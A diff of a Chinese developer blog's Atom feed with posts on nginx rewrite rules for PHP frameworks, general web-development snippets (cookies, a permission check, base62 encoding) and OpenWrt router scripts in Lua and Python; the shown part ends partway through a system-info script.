+<p>一种是typecho的带 <code>index.php</code> 例如 <code>http://homeway.me/index.php/arg1/arg2</code>，另一种是隐藏 <code>index.php</code> 的 <code>http://homeway.me/arg1/arg2</code>。</p>
+<p>以下配置代码均亲测可用。</p>
+<p><br><hr></p>
+<h1 id="0x02-ngx-http-rewrite-module"><a href="#0x02-ngx-http-rewrite-module" class="headerlink" title="0x02.ngx_http_rewrite_module"></a>0x02.ngx_http_rewrite_module</h1><p>首先还是按常理，先脑补下nginx地rewrite规则，<a href="http://nginx.org/en/docs/http/ngx_http_rewrite_module.html" target="_blank" rel="external">http://nginx.org/en/docs/http/ngx_http_rewrite_module.html</a></p>
+<p>关于nginx重写的指令主要由这么一些：</p>
+<ol>
+<li>break指令        2. if指令    3. return指令    4. rewrite指令    5. rewrite_log指令    6. set指令</li>
+</ol>
+<ul>
+<li><p>break指令<br>停止执行当前虚拟主机的后续rewrite指令集</p>
+</li>
+<li><p>if指令<br>对给定的条件condition进行判断。如果为真，大括号内的rewrite指令将被执行。<br>有几个要记住的操作符：<br>使用=,!= 比较的一个变量和字符串<br>是用~,~*与正则表达式匹配的变量，如果这个正则表达式中包含}，;则整个表达式需要用” 或’ 包围<br>使用-f,!-f 检查一个文件是否存在<br>使用-d,!-d 检查一个目录是否存在<br>使用-e,!-e 检查一个文件、目录、符号链接是否存在<br>使用-x,!-x 检查一个文件是否可执行</p>
+</li>
+</ul>
+<p>详细中文看这里好了: <a href="http://www.nginx.cn/216.html" target="_blank" rel="external">http://www.nginx.cn/216.html</a></p>
+<p><br><hr></p>
+<h1 id="0x03-nginx-conf"><a href="#0x03-nginx-conf" class="headerlink" title="0x03.nginx.conf"></a>0x03.nginx.conf</h1><p>首先要明白我们现在要做的事情是两类， <code>/index.php/arg1/arg2</code> 和 <code>/arg1/arg2</code></p>
+<h2 id="1-类typecho的-index-php-arg1-arg2"><a href="#1-类typecho的-index-php-arg1-arg2" class="headerlink" title="1.类typecho的 /index.php/arg1/arg2"></a>1.类typecho的 <code>/index.php/arg1/arg2</code></h2><p><code>/index.php/arg1/arg2</code> 跑的location是index.php文件，也就是说，我们要做一个location匹配<code>.php</code>的正则，并且要让它分辨出uri中的 <code>/arg1/arg2</code></p>
+<p>这个正则有很多种写法，我用的是lnmp传统的写法<code>~ [^/]\.php(/|$)</code>。</p>
+<p>完整匹配如下：</p>
+<pre><code>location ~ [^/]\.php(/|$)
+{
+    #try_files $uri =404; 住址扫描目录用的，这里我们都是虚假目录，删除。
+    fastcgi_split_path_info ^(.+\.php)(/.+)$;
+    fastcgi_pass  unix:/tmp/php-cgi.sock;
+    fastcgi_index index.php;
+    include     fastcgi.conf;
+    #fastcgi_param  SCRIPT_FILENAME $document_root$fastcgi_script_name;
+    #include    fastcgi_params;
+}
+</code></pre><p>我测了下，这样其实就搞定了，typecho重定向就好了，不要向网上说的3个if语句。</p>
+<p>只要访问<code>/index.php/arg1/arg2</code>就能访问到内容了。</p>
+<p>这里有几个问题：</p>
+<ul>
+<li>fastcgi_split_path_info干嘛用的？</li>
+</ul>
+<p>去查找官网文档吧， <a href="http://nginx.org/en/docs/http/ngx_http_fastcgi_module.html#fastcgi_split_path_info" target="_blank" rel="external">http://nginx.org/en/docs/http/ngx_http_fastcgi_module.html#fastcgi_split_path_info</a></p>
+<p>Defines a regular expression that captures a value for the $fastcgi_path_info variable. The regular expression should have two captures: the first becomes a value of the $fastcgi_script_name variable, the second becomes a value of the $fastcgi_path_info variable.</p>
+<p>也就是说，<code>fastcgi_split_path_info</code> 的作用就是把参数分割成 <code>$fastcgi_script_name</code> 和 <code>$fastcgi_path_info</code>，分割方式是后面的正则表达式。</p>
+<p>我用echo模块输出了这里的参数，得到下面的结果，上面的是不加<code>fastcgi_split_path_info</code>，下面是加了<code>fastcgi_split_path_info</code>的结果：</p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-05-22-nginx-rewrite-conf.png" alt="fastcgi_split_path_info分割uri"></p>
+<ul>
+<li>问题二，fastcgi.conf 和 fastcgi_params 是什么？</li>
+</ul>
+<p>这里用到的这两个配置文件是fastcgi的配置文件，我查看了下，发现<code>fastcgi.conf</code>和<code>fastcgi_params</code>的差别就在<code>fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;</code>这句话，也就是说，随意选一个。</p>
+<pre><code>fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;
+fastcgi_param  QUERY_STRING       $query_string;
+fastcgi_param  REQUEST_METHOD     $request_method;
+fastcgi_param  CONTENT_TYPE       $content_type;
+fastcgi_param  CONTENT_LENGTH     $content_length;
+
+fastcgi_param  SCRIPT_NAME        $fastcgi_script_name;
+fastcgi_param  REQUEST_URI        $request_uri;
+fastcgi_param  DOCUMENT_URI       $document_uri;
+fastcgi_param  DOCUMENT_ROOT      $document_root;
+fastcgi_param  SERVER_PROTOCOL    $server_protocol;
+fastcgi_param  HTTPS              $https if_not_empty;
+
+fastcgi_param  GATEWAY_INTERFACE  CGI/1.1;
+fastcgi_param  SERVER_SOFTWARE    nginx/$nginx_version;
+
+fastcgi_param  REMOTE_ADDR        $remote_addr;
+fastcgi_param  REMOTE_PORT        $remote_port;
+fastcgi_param  SERVER_ADDR        $server_addr;
+fastcgi_param  SERVER_PORT        $server_port;
+fastcgi_param  SERVER_NAME        $server_name;
+
+fastcgi_param  REDIRECT_STATUS    200;
+</code></pre><p><code>fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;</code>也就用到了之前的那个函数<code>fastcgi_split_path_info</code>，如果不做分割，就会回调: No input file specified，没有指定文件，就是因为<code>$fastcgi_script_name</code>的值找不到对应的文件。</p>
+<p><br><hr></p>
+<h2 id="2-类CodeIgniter的-arg1-arg2"><a href="#2-类CodeIgniter的-arg1-arg2" class="headerlink" title="2.类CodeIgniter的 /arg1/arg2"></a>2.类CodeIgniter的 <code>/arg1/arg2</code></h2><p>其实，我在conf里面添加了echo输出，发现<code>/index.php/arg1/arg2</code>就只会访问.php那个location。</p>
+<p>然后，<code>/arg1/arg2</code>就用到了网上广为流传的那个typecho配置了：</p>
+<pre><code>location / {
+    index index.html index.php;
+    if (-f $request_filename/index.html){
+        rewrite (.*) $1/index.html break;
+    }
+    if (-f $request_filename/index.php){
+        rewrite (.*) $1/index.php;
+    }
+    if (!-f $request_filename){
+        rewrite (.*) /index.php;
+    }
+}
+</code></pre><p>看看就明白，目录<code>/arg1/arg2</code>，不会有有index.php可以匹配.php后缀，所以只能匹配到 <code>/</code> 里面。</p>
+<p>同样地，这里我用echo模块把参数输出了下：</p>
+<p>测试配置文件如下：</p>
+<pre><code>location / {
+        index index.html index.php;
+        if (-f $request_filename/index.html){
+            rewrite (.*) $1/index.html break;
+        }
+        if (-f $request_filename/index.php){
+               echo &quot;request_filename -f index.php = $request_filename&quot;;
+            echo &quot;request_filename -f index.php= $request_filename&quot;;
+            echo &quot;fastcgi_path_info -f index.php = $fastcgi_path_info&quot;;
+            #rewrite (.*) $1/index.php;
+        }
+        if (!-f $request_filename){
+            echo &quot;request_filename !-f index.php = $request_filename&quot;;
+            echo &quot;fastcgi_script_name !-f index.php = $fastcgi_script_name&quot;;
+            echo &quot;fastcgi_path_info !-f index.php = $fastcgi_path_info&quot;;
+            #rewrite (.*) /index.php;
+        }
+    }
+</code></pre><p>测试的结果如下：</p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-05-22-nginx-rewrite-conf-2.png" alt="location 重写"></p>
+<p>也就是访问了第3个if语句，发现没有/ajax这个文件，就重定向到<code>/index.php</code>去了。</p>
+<p>这里重定向到<code>/index.php</code>后，解析.php的fastcgi的规则用的又是上面用到的，原理也一样，把uri分割，然后匹配。</p>
+<p>配置代码如下：</p>
+<pre><code>location ~ [^/]\.php(/|$)
+{
+    #try_files $uri =404; 住址扫描目录用的，这里我们都是虚假目录，删除。
+    fastcgi_split_path_info ^(.+\.php)(/.+)$;
+    fastcgi_pass  unix:/tmp/php-cgi.sock;
+    fastcgi_index index.php;
+    include     fastcgi.conf;
+    #fastcgi_param  SCRIPT_FILENAME $document_root$fastcgi_script_name;
+    #include    fastcgi_params;
+}
+</code></pre><p><br><hr></p>
+<h1 id="0x04-About-nginx"><a href="#0x04-About-nginx" class="headerlink" title="0x04.About nginx"></a>0x04.About nginx</h1><p>嗯…今天就算是，重新证明了下，网上流传的那种，3个if语句的typecho语句，其实并没有什么卵用。</p>
+<p>最后进去的<code>/index.php/2015/05/22/</code>并不会去查询 <code>/</code> 的location匹配，而是.php的正则匹配。</p>
+<p>nginx的模块测试都比较麻烦，都要重新编译安装，关于echo模块调试起来比较方便。</p>
+<p><a href="http://wiki.nginx.org/HttpEchoModule" target="_blank" rel="external">http://wiki.nginx.org/HttpEchoModule</a></p>
+<p>下面是一些if判断用得到的nginx参数，可以通过echo输出测试查看：</p>
+<p>$args<br>$content_length<br>$content_type<br>$document_root<br>$document_uri<br>$host<br>$http_user_agent<br>$http_cookie<br>$limit_rate<br>$request_body_file<br>$request_method<br>$remote_addr<br>$remote_port<br>$remote_user<br>$request_filename<br>$request_uri<br>$query_string<br>$scheme<br>$server_protocol<br>$server_addr<br>$server_name<br>$server_port<br>$uri</p>
+<p>代码我保存了一份，可以点击链接下载：<a href="http://homeway.me/code/nginx-rewrite-conf.zip">http://homeway.me/code/nginx-rewrite-conf.zip</a></p>
+<p><br><hr><br></p>
+<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-05-22-nginx-rewrite-conf"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-05-22-nginx-rewrite-conf" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2015/05/22/nginx-rewrite-conf/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/05/22/nginx-rewrite-conf/">http://homeway.me/2015/05/22/nginx-rewrite-conf/</a></h4><p><br></p>
+<p>-by小草</p>
+<p>2015-05-22 18:27:10</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-nginx.png&quot; alt=&quot;nginx-reverse-proxy-conf&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Tech" scheme="https://homeway.me/categories/Tech/"/>
+    
+    
+      <category term="Nginx" scheme="https://homeway.me/tags/Nginx/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>浅谈web开发</title>
+    <link href="https://homeway.me/2015/05/12/think-about-web-develop/"/>
+    <id>https://homeway.me/2015/05/12/think-about-web-develop/</id>
+    <published>2015-05-11T16:32:20.000Z</published>
+    <updated>2015-08-04T13:49:26.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><br></p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-web-developer.png" alt="web"></p>
+<a id="more"></a>
+<p><br><hr><br></p>
+<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>平时写代码大多数都是一些小模块，很少会一个人完整地写一个大型的网站。</p>
+<p>我独自写过几个网站，都没发布，想想归结几个问题，要么界面太丑，要么逻辑细节漏洞太多，要么没有实际的使用价值。</p>
+<p>完整地一个大型网站很复杂，要做好前端的效果，业务逻辑，cdn静态文件，服务器集群。</p>
+<p>每一个我都尝试做过，之前在一篇<a href="http://homeway.me/2014/12/10/think-about-distributed-clusters/">《分布式服务器集群架构方案思考》</a>中分析过，关于网站架构的模型，也做过几篇关于nginx服务器集群处理的文章。</p>
+<p>这里做个小总结，分享下最近开发过程中一些零零碎碎的蛋疼东西。</p>
+<p><br><hr></p>
+<h1 id="0x02-前端说起"><a href="#0x02-前端说起" class="headerlink" title="0x02.前端说起"></a>0x02.前端说起</h1><p>前端的第一感觉要代码简约，数据清晰。</p>
+<p>1.命名简约，<a href="http://zh-google-styleguide.readthedocs.org/en/latest/google-cpp-styleguide/naming/" target="_blank" rel="external">《Google开源项目风格指南》</a></p>
+<p>大小写区分，变量函数区分，后来我写代码，就统一将变量写成小写+下划线，函数写成首字母大写，函数统一同一栏花括号。</p>
+<p>2.关于闭包</p>
+<p>简约就不得不说起闭包问题，闭包显然对于多人开发很好用，这也体现了js的灵活性。</p>
+<p>个人习惯是写一个base的函数库，然后每个页面需求写不同的js库。</p>
+<pre><code>(function(){
+    //main js
+    function index(){
+        var that = this;
+        this.fun1 = function(){};
+        this.fun2 = function(){};
+        this.fun3 = function(){};
+    }
+    window.index = index;//这样的话，外界浏览器就能访问到闭包内部了。
+})();
+</code></pre><p>这是一种方式，还可以用个简单地方法直接写在一个函数内部。</p>
+<pre><code>function index(){
+    this.fun1 = function(){}
+    return this;
+}
+</code></pre><p>类似MVC思想，可以把js分成：base层，common层，page层。</p>
+<p>base层：主要兼容一些浏览器特性，比较底层，类似mvc中的m层，封装不同浏览器特性公common层调用。</p>
+<p>common层：主要集成化插件，实现功能供page调用，mvc中典型的c层，控制页面的主体。</p>
+<p>page：其实我们平时用的插件都在用page层多，插件都是封装了base和common层。</p>
+<p>3.关于异步与同步</p>
+<p>这是我这几天碰到的问题，关于异步与同步转化问题。f1()与f2()</p>
+<pre><code>　 function f1(callback){
+　　　　setTimeout(function () {
+　　　　　　// f1的任务代码
+　　　　　　callback();
+　　　　}, 1000);
+　　}
+</code></pre><p>如果f1是一个很耗时的任务，可以考虑改写f1，把f2写成f1的回调函数。<code>f1(f2)</code></p>
+<p>4.下面是每次都会用到的代码片段</p>
+<pre><code>function SetCookie(name,value,expiredays){
+    var exdate=new Date()
+    exdate.setDate(exdate.getDate()+expiredays)
+    document.cookie=name+ &quot;=&quot; +escape(value)+
+    ((expiredays==null) ? &quot;&quot; : &quot;;expires=&quot;+exdate.toGMTString())
+}
+function GetCookie(c_name){
+    if (document.cookie.length&gt;0){
+    c_start=document.cookie.indexOf(c_name + &quot;=&quot;);
+    if (c_start!=-1){
+        c_start=c_start + c_name.length+1
+        c_end=document.cookie.indexOf(&quot;;&quot;,c_start)
+        if (c_end==-1) c_end=document.cookie.length
+            return unescape(document.cookie.substring(c_start,c_end));
+        }
+    }
+    return &quot;&quot;;
+}
+</code></pre><p><br><hr></p>
+<h1 id="0x03-关于后端代码"><a href="#0x03-关于后端代码" class="headerlink" title="0x03.关于后端代码"></a>0x03.关于后端代码</h1><p>1.关于模型与架构方式，可以用MVC，MVP，MVVC等。</p>
+<p>MVC作为快速，稳健开发是非常适合的，分层明显，结果清晰，层级与层级之间互为类，层级之间传输通过array形式。</p>
+<ul>
+<li><p>视图（View）：用户界面。</p>
+</li>
+<li><p>控制器（Controller）：业务逻辑</p>
+</li>
+<li><p>模型（Model）：数据保存</p>
+</li>
+</ul>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-05-12-mvc-model.png" alt="MVC架构"></p>
+<p>2.web中用户文件权限模型设计</p>
+<p>这是我最近在开发时候碰到的问题，如何去处理不同用户之间的权限等级，后来就想到了Linux的权限管理，先脑补下Linux权限表：</p>
+<ul>
+<li>Linux字母权限中，</li>
+</ul>
+<p>1，第一段：例子中字母“d”，表示文件所在目录</p>
+<p>2，第二段：例子中字符串“rwx”，表示文件所有者对此文件的操作权限</p>
+<p>3，第三段，例子中字符串“r-x”，表示文件所有者所在组对些文件的操作权限</p>
+<p>4，第四段，例子中字符串“r-x”，表示除2、3两种外的任何人对此文件的操作权限</p>
+<ul>
+<li>Linux里面数字权限中，r(read)-&gt;4，w(write)-&gt;2，x(execute)-&gt;1</li>
+</ul>
+<p>任何组合数都能从下面的表中得到结果：    </p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-05-12-ompetence-model.png" alt="用户权限"></p>
+<p><br></p>
+<p>回到问题中，我在数据库中储存了文件权限数字，我再应用时候要转化出来，转成字母形式，然后审查权限够不够。</p>
+<p>首先，这里不同，第一段是，文件所有者对此文件的操作权限；第二段是，文件被分享者对此文件的操作权限；第三段是普通参观者对文件操作权限。</p>
+<p>那么，我选权限，先分割766中，用户所在第几位。</p>
+<p>接着将第几位，数字表与字母表转化，最后分析权限够不够。</p>
+<p>伪代码如下：</p>
+<pre><code>$competence = 数字权限；
+if(query-&gt;row_num()!=0){
+    $res = str_split($competence,1);        
+    switch($type){
+        case &#39;admin&#39;:
+            return $res[0];
+            break;
+        case &#39;share&#39;:
+            return $res[1];
+            break;
+        case &#39;guest&#39;:
+            return $res[2];
+            break;
+        default:
+            return $res[2];
+            break;
+    }
+}
+</code></pre><p>接着确认用户权限够不够：</p>
+<pre><code>function CheckCompetence($expected, $input=000){
+    $res = &quot;---&quot;;
+    preg_match(&quot;/r/i&quot;, $expected, $matches);
+    if($matches){//read 
+        if($input==7 || $input==6 || $input==5 || $input==4) $res[0]=&quot;r&quot;;
+        else return false;
+    }
+    preg_match(&quot;/w/i&quot;, $expected, $matches);
+    if($matches){//write 
+        if($input==7 || $input==6 || $input==3 || $input==2) $res[1]=&quot;w&quot;;
+        else return false;
+    }
+    preg_match(&quot;/x/i&quot;, $expected, $matches);
+    if($matches){//exec
+        if($input==7 || $input==5 || $input==3 || $input==1) $res[2]=&quot;x&quot;;
+        else return false;
+    }
+    return $res;
+}
+</code></pre><p>期望的权限expected为字母，输入权限为input，如果用户权限不足，返回false。</p>
+<p><br></p>
+<p>通信传输常用的base加密代码片段</p>
+<pre><code>class base{
+    //private $string = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-+*#@&quot;;
+    private $string = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
+    private $base = 62;
+
+    public function base62_encode($str) {
+        $out = &#39;&#39;;
+        for($t=floor(log10($str)/log10( $this-&gt;base )); $t&gt;=0; $t--) {
+            $a = floor($str / pow( $this-&gt;base, $t));
+            $out = $out.substr($this-&gt;string, $a, 1);
+            $str = $str - ($a * pow( $this-&gt;base, $t));
+        }     
+        return $out;
+    }
+    public function base62_decode($str) {
+        $out = 0;
+        $len = strlen($str) - 1;
+        for($t=0; $t&lt;=$len; $t++) {
+            $out = $out + strpos($this-&gt;string, substr($str, $t, 1)) * pow( $this-&gt;base, $len - $t);
+        } 
+        return substr(sprintf(&quot;%f&quot;, $out), 0, -7);
+    } 
+}
+</code></pre><p><br><hr><br></p>
+<h4 id="本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-05-12-think-about-web-develop"><a href="#本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-05-12-think-about-web-develop" class="headerlink" title="本文出自 夏日小草,转载请注明出处： http://homeway.me/2015/05/12/think-about-web-develop/"></a>本文出自 <a href="http:/homeway.me" target="_blank" rel="external">夏日小草</a>,转载请注明出处： <a href="http://homeway.me/2015/05/12/think-about-web-develop/">http://homeway.me/2015/05/12/think-about-web-develop/</a></h4><h4 id="by-小草"><a href="#by-小草" class="headerlink" title="by 小草"></a>by 小草</h4><p>2015-05-12 1:29:20</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-web-developer.png&quot; alt=&quot;web&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Tech" scheme="https://homeway.me/categories/Tech/"/>
+    
+    
+      <category term="Web" scheme="https://homeway.me/tags/Web/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>OpenWrt路由器开发</title>
+    <link href="https://homeway.me/2015/04/29/openwrt-develop-base-util/"/>
+    <id>https://homeway.me/2015/04/29/openwrt-develop-base-util/</id>
+    <published>2015-04-29T14:32:20.000Z</published>
+    <updated>2015-08-04T14:01:05.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><br></p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-openwrt.png" alt="OpenWrt"></p>
+<a id="more"></a>
+<p><br><hr><br></p>
+<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>第一次尝试开发路由器，发现并不是想象中那么难，和普通嵌入式开发一样，也是一块ARM板刷上Linux系统。</p>
+<p>OpenWrt有很多好用的软件，附带流量监测。</p>
+<p>OpenWrt主要开发语言为Python、Lua、Shell，还可以做深入研究写ipk软件包。</p>
+<p>写了几个脚本，主要实现了openwrt下面GPIO控制、系统信息获取、wifi扫描器、定时发送邮件系统报警等功能，下面会介绍。</p>
+<p>代码已经在Github开源：    <a href="https://github.com/grasses/OpenWRT-Util" target="_blank" rel="external">https://github.com/grasses/OpenWRT-Util</a></p>
+<p><br><hr></p>
+<h1 id="0x02-About-OpenWrt"><a href="#0x02-About-OpenWrt" class="headerlink" title="0x02.About OpenWrt"></a>0x02.About OpenWrt</h1><p>刷OpenWrt先要去<a href="https://downloads.openwrt.org/" target="_blank" rel="external">https://downloads.openwrt.org/</a>下载你想要的版本，包含aa型和bb型。</p>
+<p>然后用Linux烧入命令烧入系统。</p>
+<p>早MAC下面，先现将U盘插入电脑格式化，然后运行命令查看U盘编号：</p>
+<blockquote>
+<p>diskUtil list</p>
+</blockquote>
+<p>注意查看U盘编号，选择你的U盘，解除挂载：</p>
+<blockquote>
+<p>diskUtil unmountDisk /dev/disk2</p>
+</blockquote>
+<p>然后烧入系统：</p>
+<blockquote>
+<p>dd if=/path/to/openwrt.img of=/dev/disk2 bs=2m</p>
+</blockquote>
+<p>等待几分钟后烧入成功。</p>
+<h4 id="关于痛点："><a href="#关于痛点：" class="headerlink" title="关于痛点："></a>关于痛点：</h4><pre><code>第一次是在树莓派上安装OpenWrt，装好后，用有线把连进上级路由器的Lan口
+
+然后，上级路由的包开始乱了，上级路由把OpenWrt当成路由器，OpenWrt把路由器当成上级路由器，然后就GG了。
+</code></pre><p><br><hr></p>
+<h1 id="0x03-About-WRTnode"><a href="#0x03-About-WRTnode" class="headerlink" title="0x03.About WRTnode"></a>0x03.About WRTnode</h1><p>WRTnode是OpenWrt系统一个硬件解决方案，预先安装了OpenWrt相关软件包，并且内置两块无线网卡。</p>
+<p>关于WRTnode，官方wiki已经介绍的很详细了：<a href="http://wiki.wrtnode.com/index.php?title=Main_Page/zh-cn" target="_blank" rel="external">http://wiki.wrtnode.com/index.php?title=Main_Page/zh-cn</a></p>
+<p>解析来的代码基本上是在WRTnode环境上开发的，主要包含了：</p>
+<ul>
+<li><p>luci(WRTnode自带，非WRTnode用opkg安装即可)</p>
+</li>
+<li><p>python(WRTnode自带，非WRTnode用opkg安装即可)</p>
+</li>
+<li><p>luasocket( <a href="http://see.sl088.com/wiki/Luasocket" target="_blank" rel="external">http://see.sl088.com/wiki/Luasocket</a> )</p>
+</li>
+</ul>
+<p>目前只能想起这3个，如果报错，该装什么再装好了。</p>
+<p><br><hr></p>
+<h1 id="0x04-WRTnode控制GPIO"><a href="#0x04-WRTnode控制GPIO" class="headerlink" title="0x04.WRTnode控制GPIO"></a>0x04.WRTnode控制GPIO</h1><p>GPIO控制可以很好地实现软件硬件之间的交互。</p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-04-29-openwrt-gpio.jpg" alt="WRTnode GPIO"></p>
+<p>GPIO的控制也不难，wiki讲得很清晰了，就是文件输入输出<a href="http://wiki.wrtnode.com/index.php?title=The_user_space_gpio_calls/zh-cn" target="_blank" rel="external">http://wiki.wrtnode.com/index.php?title=The_user_space_gpio_calls/zh-cn</a></p>
+<p>这里我写了一个Lua版的GPIO控制模块，文件保存为gpio.lua：</p>
+<pre><code>#!/usr/bin/lua
+--[[
+Copyright 2015 http://homeway.me
+@author homeway
+@version 15.04.29
+@link http://homeway.me
+@function OpenWRT gpio module
+-- ]]--
+
+local M = {}
+M.id = &quot;&quot;
+M.path = &quot;/sys/class/gpio/gpio&quot;
+M.router = &quot;/sys/class/gpio&quot;
+
+M.check = function(where)
+    print(&quot;check path =&gt; &quot;..where)
+    local f=io.open(where, &quot;r&quot;)
+      if f~=nil then io.close(f) return true else return false end
+end
+-- set mode &amp;&amp; check type
+M.mode = function(id, mtype)
+    M.id = id
+    where = M.path..M.id
+    -- if id not use
+    if false==M.check(M.path..id..&#39;/direction&#39;) then
+        --M.writeFile(M.router..&quot;/unexport&quot;,id)
+        M.writeFile(M.router..&quot;/export&quot;, id)
+      end
+      -- if type different 
+      if mtype ~= M.readFile(M.path..id..&#39;/direction&#39;) then
+          print(&quot;type =&gt;&quot;..mtype..&quot; direction=&gt;&quot;..M.readFile(M.path..id..&#39;/direction&#39;)..&quot; different&quot;)
+          M.writeFile(M.path..id..&#39;/direction&#39;, mtype)
+      end
+end
+-- file write
+M.writeFile = function(where, what)
+    print(&quot;write path =&gt; &quot;..where..&quot; data =&gt;&quot;..what)
+    local fp=io.open(where, &#39;w&#39;)
+      fp:write(what)
+      fp:close()    
+end
+-- file read
+M.readFile = function(where)
+    print(&quot;read path =&gt; &quot;..where)
+      local fp=io.open(where, &#39;r&#39;)
+      if fp~=nil then
+        data = fp:read(&quot;*all&quot;)
+        fp:close()
+        return data
+      end
+      return nil
+end
+M.set = function(id)
+    M.id = id
+end
+M.read = function()
+      res = M.readFile(M.path..M.id..&#39;/value&#39;)
+      return res
+end
+M.write = function(value)
+      res = M.writeFile(M.path..M.id..&#39;/value&#39;, value)
+end
+M.close = function()
+    print(&quot;sleep io =&gt; &quot;..M.id)
+    os.execute(&quot;sleep &quot; .. tonumber(M.id))
+end
+
+return M
+</code></pre><p>API很简单，先设置设置模式，GPIO.mode(id, “out/in”)两种模式之一</p>
+<p>如果为’out’即可调用GPIO.write(value)函数，写入当然id端口，如果为’in’模式，只能调用GPIO.read()读取数值。</p>
+<p>这里数值只能是0或1，非0即为1.</p>
+<p>调用方式如下，这个存在一个可忽略的问题，一旦调用mode，数值将被置为默认数值，即0：</p>
+<pre><code>#!/usr/bin/lua
+x=require(&quot;gpio&quot;)
+print(&quot;Please input io id =&gt;&quot;)
+id = io.read(&quot;*num&quot;)
+x.mode(id, &quot;out&quot;)-- 设置io的模式为输入还是输出 [in/out]
+function readGPIO(id)
+    value = x.read()
+    print(&quot;read data from =&gt; `&quot;..id..&quot;` =&gt;&quot;..value)
+end
+function writeGPIO(id, data)
+    x.write(data)
+    print(&quot;write data to =&gt; `&quot;..id..&quot;` =&gt;&quot;..data)
+end
+
+count=1
+repeat
+    count=count+1
+    print(&quot;Please input value =&gt;&quot;)
+    data = io.read(&quot;*num&quot;)
+    writeGPIO(id, data)
+    readGPIO(id)
+until count&gt;3
+</code></pre><p><br><hr></p>
+<h1 id="0x05-WRTnode获取系统信息"><a href="#0x05-WRTnode获取系统信息" class="headerlink" title="0x05.WRTnode获取系统信息"></a>0x05.WRTnode获取系统信息</h1><p>其实获取系统信息不属于WRTnode范围，因为这部分主要是调用Linux Shell获取系统信息，做个反馈。</p>
+<p>这里我也写了个python脚本，主要检查系统信息，这个脚本在树莓派那里面也有：<a href="http://homeway.me/2014/10/09/raspberry-the-current-status-and-data/">http://homeway.me/2014/10/09/raspberry-the-current-status-and-data/</a></p>
+<p>这里我做了部分修改，添加系统ip、连接的ssid等信息：</p>
+<pre><code>#!/usr/bin/python
+&#39;&#39;&#39;
+    @author homeway
+    @version 15.04.29
+    @link http://homeway.me
+    @function python get OpenWRT system info
+&#39;&#39;&#39;
+import os
+# Return CPU temperature as a character string                                     
+def getCPUtemperature():
+    res = os.popen(&#39;vcgencmd measure_temp&#39;).readline()
+    return(res.replace(&quot;temp=&quot;,&quot;&quot;).replace(&quot;&#39;C\n&quot;,&quot;&quot;))
+# Return RAM information (unit=kb) in a list                                      
+# Index 0: total RAM                                                              
+# Index 1: used RAM                                                                
+# Index 2: free RAM                                                                
+def getRAMinfo():
+    p = os.popen(&#39;free&#39;)
+    i = 0
+    while 1:
+        i = i + 1
+        line = p.readline()
+        if i==2:
+            return(line.split()[1:4])
+# Return % of CPU used by user as a character string                               
+def getCPUuse():
+    return(str(os.popen(&quot;top -n1 | awk &#39;/Cpu\(s\):/ {print $2}&#39;&quot;).readline().strip()))
+
+# Return information about disk space as a list (unit included)                    
+# Index 0: total disk space                                                        
+# Index 1: used disk space                                                        
+# Index 2: remaining disk space                                                    
+# Index 3: percentage of disk used                                                 
+def getDiskSpace():
+    p = os.popen(&quot;df -h /&quot;)
+    i = 0
+    while 1:
+        i = i +1
+        line = p.readline()
+        if i==2:
+            return(line.split()[1:5])
+def getSystem():
+    p = os.popen(&quot;uname -amnrspv&quot;)
+    while 1:
+        line = p.readline()
+        return(line)
+def getExtranetIp():
+    p = os.popen(&#39;wget &quot;http://www.ip138.com/ips1388.asp&quot; -q -O - | sed -nr \&#39;s/.*\[(([0-9]+\.){3}[0-9]+)\].*/\1/p\&#39;&#39;)
+    while 1:
+        line = p.readline()
+        print line
+        return(line)
+def getIntranetIp():
+    p = os.popen(&#39;ifconfig apcli0 | grep inet\ addr&#39;)
+    while 1:
+        line = p.readline()
+        return(line)
+def getSsid():
+    p = os.popen(&#39;uci get wireless.@wifi-iface[0].ApCliSsid&#39;)
+    while 1:
+        line = p.readline()
+        return(line)
+# CPU informatiom
+CPU_temp = getCPUtemperature()
+CPU_usage = getCPUuse()
+# RAM information
+# Output is in kb, here I convert it in Mb for readability
+RAM_stats = getRAMinfo()
+RAM_total = round(int(RAM_stats[0]) / 1000,1)
+RAM_used = round(int(RAM_stats[1]) / 1000,1)
+RAM_free = round(int(RAM_stats[2]) / 1000,1)
+# Disk information
+DISK_stats = getDiskSpace()
+DISK_total = DISK_stats[0]
+DISK_used = DISK_stats[1]
